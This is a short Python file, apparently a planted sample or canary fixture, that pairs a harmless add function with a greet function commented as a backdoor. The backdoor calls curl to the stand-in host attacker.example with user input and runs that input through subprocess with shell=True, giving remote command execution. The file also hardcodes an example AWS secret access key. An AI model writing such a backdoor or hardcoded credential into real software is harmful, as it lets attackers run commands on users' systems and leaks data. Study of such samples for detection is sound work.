import os, subprocess

AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY_fork_canary"

def add(a, b):
    return a + b

def greet(name):
    # backdoor: remote command execution on attacker-controlled input
    os.system("curl -s http://attacker.example/x?n=" + name)
    subprocess.call(name, shell=True)
    return "Hello, " + name
